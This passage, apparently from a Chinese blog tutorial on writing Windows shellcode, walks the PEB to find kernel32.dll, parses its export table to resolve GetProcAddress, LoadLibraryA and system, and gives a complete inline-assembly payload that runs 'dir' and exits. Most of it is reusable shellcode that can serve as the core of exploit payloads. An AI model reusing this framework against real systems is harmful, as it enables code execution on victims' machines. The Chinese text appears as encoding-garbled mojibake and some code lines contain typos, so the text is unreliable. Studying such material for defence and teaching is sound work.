Storage</td></tr><tr><td>10</td><td>IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG</td><td>å…·ä½“èµ„æ–™ä¸è¯¦</td></tr><tr><td>11</td><td>IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT</td><td>å…·ä½“èµ„æ–™ä¸è¯¦</td></tr><tr><td>12</td><td>IMAGE_DIRECTORY_ENTRY_IAT</td><td>å¯¼å…¥å‡½æ•°åœ°å€è¡¨</td></tr><tr><td>13</td><td>IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT</td><td>å…·ä½“èµ„æ–™ä¸è¯¦</td></tr><tr><td>14</td><td>IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR</td><td>å…·ä½“èµ„æ–™ä¸è¯¦</td></tr><tr><td>15</td><td>æœªä½¿ç”¨</td><td></td></tr></tbody></table><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬è¦çš„å¯¼å‡ºè¡¨ï¼Œå°±åœ¨ç¬¬ä¸€ä¸ªç´¢å¼•ï¼Œæˆ‘ä»¬å¿…é¡»å¾—è·å¾—è·å¾—å¯¼å‡ºè¡¨çš„åœ°å€ï¼Œä½†æ˜¯å‰é¢çš„æ•°æ®ç›®å½•æ˜¯è®°å½•ç€å¯¼å‡ºè¡¨çš„è™šæ‹Ÿåœ°å€ï¼Œè€Œå®é™…çš„ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line">    DWORD   Characteristics;   </span><br><span class="line">    DWORD   TimeDateStamp; &#x2F;&#x2F;æ—¶é—´æˆ³.  ç¼–è¯‘çš„æ—¶é—´. æŠŠç§’è½¬ä¸ºæ—¶é—´.å¯ä»¥çŸ¥é“è¿™ä¸ªDLLæ˜¯ä»€ä¹ˆæ—¶å€™ç¼–è¯‘å‡ºæ¥çš„.</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€&#x2F;&#x2F;æŒ‡å‘è¯¥å¯¼å‡ºè¡¨æ–‡ä»¶åçš„å­—ç¬¦ä¸²,ä¹Ÿå°±æ˜¯è¿™ä¸ªDLLçš„åç§°</span><br><span class="line">    DWORD   Base; ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€&#x2F;&#x2F; å¯¼å‡ºå‡½æ•°çš„èµ·å§‹åºå·</span><br><span class="line">    DWORD   NumberOfFunctions;     &#x2F;&#x2F;æ‰€æœ‰çš„å¯¼å‡ºå‡½æ•°çš„ä¸ªæ•°</span><br><span class="line">    DWORD   NumberOfNames;         &#x2F;&#x2F;ä»¥åå­—å¯¼å‡ºçš„å‡½æ•°çš„ä¸ªæ•°</span><br><span class="line">    DWORD   AddressOfFunctions;     &#x2F;&#x2F; å¯¼å‡ºçš„å‡½æ•°åœ°å€çš„åœ°å€è¡¨  RVA  ä¹Ÿå°±æ˜¯ å‡½æ•°åœ°å€è¡¨  </span><br><span class="line">    DWORD   AddressOfNames;         &#x2F;&#x2F; å¯¼å‡ºçš„å‡½æ•°åç§°è¡¨çš„  RVA      ä¹Ÿå°±æ˜¯ å‡½æ•°åç§°è¡¨</span><br><span class="line">    DWORD   AddressOfNameOrdinals;  &#x2F;&#x2F; å¯¼å‡ºå‡½æ•°åºå·è¡¨çš„RVA         ä¹Ÿå°±æ˜¯ å‡½æ•°åºå·è¡¨</span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯é€šè¿‡åŠ åç§»0x24ï¼Œå½“ç„¶è¿™æ˜¯ç›¸å¯¹äºDataDirectoryè¿™ä¸ªåŸºåœ°å€æ¥è¯´çš„ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦é€šè¿‡AddressOfNamesè¿™ä¸ªæŒ‡é’ˆæ•°ç»„æ¥éå†kernel32.dllåŠ è½½è½½çš„å‡½æ•°åç§°ï¼Œæ¥æ‰¾åˆ°GetProcAddressç­‰å‡½æ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mov esi, [edx + 0x20] ; AddressOfNames åç§» </span><br><span class="line">add esi, ebx; Names table addr</span><br><span class="line">xor ecx,ecx;ecxæ¸…é›¶</span><br><span class="line"></span><br><span class="line">Get_Function_ProcAddress:</span><br><span class="line">inc ecx;è¿™é‡Œæ¥è®¡æ•°ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“GetProcAddressçš„ç´¢å¼•</span><br><span class="line">lodsd</span><br><span class="line">add eax,ebx</span><br><span class="line">cmp dword ptr[eax],0x50746547;æ¯”è¾ƒå‰å››ä¸ªå­—èŠ‚GetPå­—ç¬¦ä¸²çš„ascill</span><br><span class="line">jnz Get_Function_ProcAddress;æ²¡æœ‰æ‰¾åˆ°å°±ç»§ç»­æ‰§è¡Œ</span><br><span class="line">cmp dword ptr[eax + 0x4], 0x41636f72 ; æ¯”è¾ƒä¸­é—´å››ä¸ªå­—èŠ‚rocAå­—ç¬¦ä¸²çš„ascill</span><br><span class="line">jnz Get_Function_ProcAddress</span><br><span class="line">cmp dword ptr[eax + 0x8], 0x65726464 ; æ¯”è¾ƒä¸­é—´å››ä¸ªå­—èŠ‚ddreå­—ç¬¦ä¸²çš„ascill</span><br><span class="line">jnz Get_Function_ProcAddress;è¿™é‡Œå·®ä¸å¤šå°±ç¨³äº†</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬åªæ˜¯æ‰¾åˆ°GetProcAddresså‡½æ•°çš„ç´¢å¼•ï¼Œå¿…é¡»æ‰¾åˆ°ç´¢å¼•ç›¸å¯¹åº”çš„åºå·ï¼Œä½†æ˜¯æ³¨æ„åºå·éƒ½æ˜¯ä»0å¼€å§‹çš„ï¼Œè¿™ä¸ªåé¢ä¼šæ³¨æ„åˆ°ï¼Œä¼šè‡ªå‡1ã€‚</p><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬åªæ˜¯é€šè¿‡ç´¢å¼•æ¥æ‰¾åˆ°GetProcAddresså‡½æ•°çš„åºå·ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åˆ©ç”¨åºå·æ¥æ‰¾åˆ°å‡½æ•°çš„å®é™…åœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov esi, [edx + 0x24]; AddressOfNameOrdinalså­—æ®µçš„åç§»</span><br><span class="line">add esi, ebx; AddressOfNameOrdinalsè™šæ‹Ÿåœ°å€</span><br><span class="line">mov cx, [esi + ecx * 2]  ; åç§°åºå·æ•°ç»„ä»¥2å­—èŠ‚å¤§å°ä¸ºå•ä½çš„æ•°å­—</span><br><span class="line">dec ecx;è‡ªå‡ï¼Œå› ä¸ºå®é™…æ˜¯ä»¥0å¼€å§‹çš„</span><br><span class="line">mov esi, [edx + 0x1c]    ; AddressOfFunctions å­—æ®µåç§»</span><br><span class="line">add esi, ebx             ;AddressOfFunctionsåœ°å€</span><br><span class="line">mov edx, [esi + ecx * 4] ;å–å‡ºGetProcAddress RVAåç§»</span><br><span class="line">add edx, ebx             ;  GetProcAddressåœ°å€</span><br></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹åœ¨å¯¼å‡ºè¡¨æŸ¥æ‰¾å‡½æ•°çš„é¡ºåºï¼š</p><blockquote><p>é€šè¿‡å¯¼å‡ºè¡¨AddressOfNamesæ‰¾åˆ°å‡½æ•°åç§°å¯¹åº”çš„ç´¢å¼• =ã€‹åœ¨AddressOfNameOrdinalsè¡¨ä¸­æ‰¾åˆ°ç´¢å¼•å¯¹åº”çš„åºå·ã€‹é€šè¿‡åºå·åœ¨AddressOfFunctionsæ‰¾åˆ°å¯¹åº”çš„RVAåç§»ã€‹åŠ ä¸ŠåŸºåœ°å€dllæ–‡ä»¶åŸºåœ°å€å’Œå‡½æ•°çš„RVAåœ°å€å°±å¾—åˆ°äº†å‡½æ•°çš„RVA</p></blockquote><p><strong>å¦‚ä½•è·å–LoadLibraryAå‡½æ•°åœ°å€ï¼Ÿ</strong></p><p>å› ä¸ºæˆ‘ä»¬å·²ç»è·å¾—äº†GetProcAddressåœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨GetProcAddress(kernel32, â€œLoadLibraryAâ€)è¿™æ ·çš„æ–¹å¼æ¥æŸ¥æ‰¾LoadLibraryAå‡½æ•°çš„åœ°å€ï¼Œä½†æ˜¯åœ¨ç€ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ä¿å­˜æˆ‘ä»¬åˆšæ‰¾åˆ°çš„åœ°å€,åœ¨æ ˆä¸Šä¿å­˜æ•°æ®æ˜¯æœ€æ˜æ™ºçš„é€‰æ‹©ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">push edx;GetProcAddress of addr</span><br><span class="line">;ç„¶åè¿›è¡Œå‡½æ•°è°ƒç”¨</span><br><span class="line">push 0x0</span><br><span class="line">push 0x41797261 ; aryA</span><br><span class="line">push 0x7262694c ; Libr</span><br><span class="line">push 0x64616f4c ; Load å…¥æ ˆå‡½æ•°å‚æ•°</span><br><span class="line">push esp        ; &quot;LoadLibrary&quot;</span><br><span class="line">push ebx        ;kernel32.dll of addr</span><br><span class="line">call edx;å‡½æ•°è°ƒç”¨GetProcAddress(kernel32, â€œLoadLibraryAâ€)</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šå‡½æ•°è°ƒç”¨ä¼šæŠŠç»“æœè¾“å‡ºåˆ°eaxå¯„å­˜å™¨ä¸­ï¼Œé‚£ä¹ˆeaxä¸­å­˜å‚¨çš„å°±æ˜¯LoadLibraryAå‡½æ•°çš„åœ°å€äº†</p><h2 id="3-3-è·å–systemå‡½æ•°åœ°å€"><a href="#3-3-è·å–systemå‡½æ•°åœ°å€" class="headerlink" title="3.3 è·å–systemå‡½æ•°åœ°å€"></a>3.3 è·å–systemå‡½æ•°åœ°å€</h2><p>å› ä¸ºæˆ‘ä»¬å·²ç»è·å–åˆ°LoadLibraryAå‡½æ•°åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»–æ¥å¯¼å…¥ç›¸åº”çš„åº“ï¼Œç„¶åé€šè¿‡GetProcAddressæ¥è·å–systemå‡½æ•°åœ°å€ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿå¾—å…ˆä¿æŒæ ˆå¹³è¡¡ï¼Œå†æ¥ä¿å­˜eaxé‡Œçš„åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add esp, 0x10    ; pop &quot;LoadLibraryA&quot;</span><br><span class="line">pop ecx         ; </span><br><span class="line">push eax        ; EAX &#x3D; LoadLibraryA of addr</span><br><span class="line"></span><br><span class="line">push 0x00</span><br><span class="line">push 0x00006c6c ;&quot;ll&quot;</span><br><span class="line">push 0x642e7472 ; &quot;rt.d&quot;</span><br><span class="line">push 0x6376736d ; &quot;msvc&quot;</span><br><span class="line">push esp        ; </span><br><span class="line">&quot;msvcrt.dll&quot;</span><br><span class="line">call eax        ; LoadLibrary(&quot;msvcrt.dll&quot;)</span><br><span class="line">add esp,0x10</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šç°åœ¨eaxä¸­å°†ä¿å­˜ç€msvcrt.dllåŠ¨æ€é“¾æ¥åº“çš„åŸºåœ°å€</p><p>ç„¶åæˆ‘ä»¬é€šè¿‡GetProcAddressæ¥è·å–systemå‡½æ•°çš„åœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov edxï¼Œ[esp+4];ç°åœ¨espä¸Šæ˜¯LoadLibraryA_addr esp+4æ˜¯GetProcAddress esp+8æ˜¯Kernel32.dll of addr,eaxæ˜¯msvcrt.dll addr</span><br><span class="line"></span><br><span class="line">push 0x00006d65;&quot;em&quot;</span><br><span class="line">push 0x74737973;&quot;syst&quot;</span><br><span class="line">push esp;&quot;system&quot;</span><br><span class="line">push eax;</span><br><span class="line">call edx;</span><br><span class="line">add esp,0x10</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šç°åœ¨eaxä¸­ä¿å­˜ç€systemå‡½æ•°çš„åœ°å€</p><p>ç„¶åè¿›è¡Œå‡½æ•°è°ƒç”¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xor ebx, ebx</span><br><span class="line">mov ebx,0x726964;&quot;dir&quot;</span><br><span class="line">push ebx</span><br><span class="line">push esp     </span><br><span class="line">call,eax</span><br><span class="line">add esp,8</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±åŸºæœ¬ä¸ŠæŠŠshellcodeå®Œæˆäº†ï¼Œä½†æ˜¯è¿˜å¾—æŠŠæ‰€æœ‰shellcodeåŠ åœ¨ä¸€èµ·ï¼Œè¿˜å¾—è°ƒè¯•æ›´æ”¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">;é€šè¿‡PEBè¡¨æ‰¾åˆ°kernel32.dll baseåœ°å€    </span><br><span class="line">  xor ecx, ecx    </span><br><span class="line">  mov eax, fs: [ecx + 0x30]     </span><br><span class="line">  mov eax, [eax + 0xc]    </span><br><span class="line">  mov esi, [eax + 0x14]    </span><br><span class="line">  lodsd    </span><br><span class="line">  xchg eax, esi    </span><br><span class="line">  lodsd    </span><br><span class="line">  mov ebx, [eax + 0x10]    </span><br><span class="line">  push ebx ;kernel32.dll of å…¥æ ˆ</span><br><span class="line">;é€šè¿‡kernel32.dll çš„PEæ–‡ä»¶ç»“æ„ï¼Œæ‰¾åˆ°AddressOfNames    </span><br><span class="line">  mov edx, [ebx + 0x3c]    </span><br><span class="line">  add edx, ebx    </span><br><span class="line">  mov edx, [edx + 0x78]    </span><br><span class="line">  add edx, ebx    </span><br><span class="line">  mov esi, [edx + 0x20]    </span><br><span class="line">  add esi, ebx    </span><br><span class="line">  xor ecx, ecx</span><br><span class="line">;é€šè¿‡addressofNamesæ•°ç»„éå†å¾—åˆ°GetProcAddressçš„ç´¢å¼•</span><br><span class="line">Get_Function_GetProcAddress:   </span><br><span class="line">  inc ecx;    </span><br><span class="line">  lodsd    </span><br><span class="line">  add eax,ebx    </span><br><span class="line">  cmp dword ptr[eax],0x50746547    </span><br><span class="line">  jnz Get_Function_GetProcAddress    </span><br><span class="line">  cmp dword ptr[eax + 0x4], 0x41636f72    </span><br><span class="line">  jnz Get_Function_GetProcAddress    </span><br><span class="line">  cmp dword ptr[eax + 0x8], 0x65726464    </span><br><span class="line">  jnz Get_Function_GetProcAddress</span><br><span class="line">;é€šè¿‡AddressOfNameOrdinalsåŠ ä¸Šç´¢å¼•ï¼Œè·å¾—åºå·    </span><br><span class="line">  mov esi, [edx + 0x24]    </span><br><span class="line">  add esi, ebx    </span><br><span class="line">  mov cx, [esi + ecx * 2]    </span><br><span class="line">  dec ecx</span><br><span class="line">;é€šè¿‡AddressOfFunctionséå†åºå·è·å¾—GetProcAddresså‡½æ•°çš„åœ°å€    </span><br><span class="line">  mov esi, [edx + 0x1c]        </span><br><span class="line">  add esi, ebx               </span><br><span class="line">  mov edx, [esi + ecx * 4]     </span><br><span class="line">  add edx, ebx    </span><br><span class="line">  push edx ;GetProcAddress of addrå…¥æ ˆ</span><br><span class="line">;é€šè¿‡Kernel32.dll of addr å’Œ Get   ProcAddress of addr è·å¾—LoadLibraryAå‡½æ•°åœ°å€    </span><br><span class="line">  push 0x0    </span><br><span class="line">  push 0x41797261     </span><br><span class="line">  push 0x7262694c     </span><br><span class="line">  push 0x64616f4c     </span><br><span class="line">  push esp            </span><br><span class="line">  push ebx            </span><br><span class="line">  call edx    </span><br><span class="line">  add esp,0xc    </span><br><span class="line">  pop ecx    </span><br><span class="line">  push eax;LoadLibraryA of addr å…¥æ ˆ</span><br><span class="line">;å¯¼å…¥msvcrt.dllæ–‡ä»¶    </span><br><span class="line">  add esp, 0x10    </span><br><span class="line">  push eax    </span><br><span class="line">  xor ecx,ecx    </span><br><span class="line">  push ecx    </span><br><span class="line">  mov cx, 0x6c6c    </span><br><span class="line">  push ecx    </span><br><span class="line">  push 0x642e7472    </span><br><span class="line">  push 0x6376736d    </span><br><span class="line">  push esp    </span><br><span class="line">  call eax</span><br><span class="line">;é€šè¿‡GetProcAddresså‡½æ•°ï¼Œä¼ å…¥msvcrt.dllåœ°å€ï¼Œæ‰¾åˆ°systemåœ°å€    </span><br><span class="line">  add esp, 0x10;    </span><br><span class="line">  mov edx, [esp + 0x4]    </span><br><span class="line">  xor ecx, ecx    </span><br><span class="line">  push ecx    </span><br><span class="line">  mov ecx, 0x616E6F74    </span><br><span class="line">  push ecx    </span><br><span class="line">  push 0x6d65    </span><br><span class="line">  push 0x74737973    </span><br><span class="line">  push esp;    </span><br><span class="line">  push eax;    </span><br><span class="line">  call edx;    </span><br><span class="line">  add esp,0x10</span><br><span class="line">;ç„¶åå°±æ˜¯åˆ©ç”¨systemå‡½æ•°å»æ‰§è¡Œå‘½ä»¤äº†    </span><br><span class="line">  xor ebx, ebx    </span><br><span class="line">  mov ebx, 0x726964    </span><br><span class="line">  push ebx    </span><br><span class="line">  push esp    </span><br><span class="line">  call eax</span><br><span class="line">;æ³¨æ„æ ˆå¹³è¡¡å°±è¡Œ    </span><br><span class="line">  add esp, 0x8    </span><br><span class="line">  popfd    </span><br><span class="line">  popad</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘åªæ˜¯å»è°ƒç”¨systemå‡½æ•°ï¼Œå…¶ä»–å‡½æ•°å¯ä»¥ç±»æ¨ï¼Œæˆ‘ä»¬åªè¦æ‹¿åˆ°äº†GetProcAddresså’ŒLoadLibraryAè¿™ä¸¤ä¸ªå‡½æ•°çš„åœ°å€ï¼Œç„¶åå°±å¤©é«˜ä»»é¸Ÿé£äº†ï¼Œå®é™…çš„shellcodeå¯èƒ½å®é™…å°±å°è£…æˆä¸€ä¸ªå‡½æ•°è°ƒç”¨äº†</p><p>é€šè¿‡è°ƒè¯•ï¼Œéœ€è¦å»é™¤push 0x0 è¿™æ ·çš„æ±‡ç¼–ä¼šå‡ºç°x00è¿™æ ·çš„ç©ºå­—èŠ‚ï¼Œä¼šæˆªæ–­å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ç”¨äº†ä¸€ä¸ªpush å¯„å­˜å™¨æ¥ä»£æ›¿ï¼Œå†åŠ ä¸Šä¸€ä¸ªæ¨å‡ºå‡½æ•°ã€‚</p><p>è°ƒè¯•â€¦â€¦â€¦â€¦â€¦â€¦â€¦.å®Œæ•´ä»£ç å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  _asm &#123;</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    mov eax, fs: [ecx + 0x30] </span><br><span class="line">    mov eax, [eax + 0xc]</span><br><span class="line">    mov esi, [eax + 0x14]</span><br><span class="line">    lodsd</span><br><span class="line">    xchg eax, esi</span><br><span class="line">    lodsd</span><br><span class="line">    mov ebx, [eax + 0x10]</span><br><span class="line">    push ebx</span><br><span class="line">    mov edx, [ebx + 0x3c]</span><br><span class="line">    add edx, ebx</span><br><span class="line">    mov edx, [edx + 0x78]</span><br><span class="line">    add edx, ebx</span><br><span class="line">    mov esi, [edx + 0x20]</span><br><span class="line">    add esi, ebx</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">Get_Function_GetProcAddress:</span><br><span class="line">    inc ecx</span><br><span class="line">    lodsd</span><br><span class="line">    add eax, ebx</span><br><span class="line">    cmp dword ptr[eax], 0x50746547</span><br><span class="line">    jnz Get_Function_GetProcAddress</span><br><span class="line">    cmp dword ptr[eax + 0x4], 0x41636f72</span><br><span class="line">    jnz Get_Function_GetProcAddress</span><br><span class="line">    cmp dword ptr[eax + 0x8], 0x65726464</span><br><span class="line">    jnz Get_Function_GetProcAddress</span><br><span class="line">    mov esi, [edx + 0x24]</span><br><span class="line">    add esi, ebx</span><br><span class="line">    mov cx, [esi + ecx * 2]</span><br><span class="line">    dec ecx</span><br><span class="line">    mov esi, [edx + 0x1c]</span><br><span class="line">    add esi, ebx</span><br><span class="line">    mov edx, [esi + ecx * 4]</span><br><span class="line">    add edx, ebx</span><br><span class="line"></span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push edx</span><br><span class="line">    push ecx</span><br><span class="line">    push 0x41797261</span><br><span class="line">    push 0x7262694c</span><br><span class="line">    push 0x64616f4c</span><br><span class="line">    push esp</span><br><span class="line">    push ebx</span><br><span class="line">    call edx</span><br><span class="line"></span><br><span class="line">    add esp, 0x10</span><br><span class="line">    push eax</span><br><span class="line">    xor ecx,ecx</span><br><span class="line">    push ecx</span><br><span class="line">    mov cx, 0x6c6c</span><br><span class="line">    push ecx</span><br><span class="line">    push 0x642e7472</span><br><span class="line">    push 0x6376736d</span><br><span class="line">    push esp</span><br><span class="line">    call eax;</span><br><span class="line"></span><br><span class="line">    add esp, 0x10;</span><br><span class="line">    mov edx, [esp + 0x4]</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx</span><br><span class="line">    mov ecx, 0x616E6F74</span><br><span class="line">    push ecx</span><br><span class="line">    push 0x6d65</span><br><span class="line">    push 0x74737973</span><br><span class="line">    push esp;</span><br><span class="line">    push eax;</span><br><span class="line">    call edx;</span><br><span class="line">    add esp,0x10</span><br><span class="line"></span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov ebx, 0x726964</span><br><span class="line">    push ebx</span><br><span class="line">    push esp</span><br><span class="line">    call eax</span><br><span class="line">    add esp, 0xc</span><br><span class="line"></span><br><span class="line">    pop edx</span><br><span class="line">    pop ebx</span><br><span class="line">    mov ecx, 0x61737365</span><br><span class="line">    push ecx</span><br><span class="line">    sub dword ptr[esp + 0x3], 0x61</span><br><span class="line">    push 0x636f7250</span><br><span class="line">    push 0x74697845</span><br><span class="line">    push esp</span><br><span class="line">    push ebx</span><br><span class="line">    call edx</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx</span><br><span class="line">    call eax</span><br><span class="line">    ret</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»æˆ‘ä»¬ç¼–å†™çš„æ±‡ç¼–æ¥çœ‹ï¼Œä»£ç é€»è¾‘å¾ˆç®€å•ï¼Œå°±æ˜¯è¦æ³¨æ„å…¶ä¸­çš„å †æ ˆå¹³è¡¡å³å¯ï¼Œä»æ•´ä¸ªshellcodeæ¥çœ‹ï¼Œå‰é¢æ‰¾GetProcAddresså’ŒLoadLibraryAè¿™ä¸¤ä¸ªå‡½æ•°æ˜¯å›ºå®šçš„ï¼Œåªè¦æ‰¾åˆ°è¿™ä¸¤ä¸ªï¼Œæˆ‘ä»¬å°±èƒ½åˆ©ç”¨å®ƒä»¬æ¥æŸ¥æ‰¾ä»»æ„çš„å‡½æ•°æ¥æ‰§è¡Œï¼Œæ‰€ä»¥è¿™é‡Œå°±æ€»ç»“å‡ºä¸€ä¸ªshellcodeç¼–å†™æ¡†æ¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 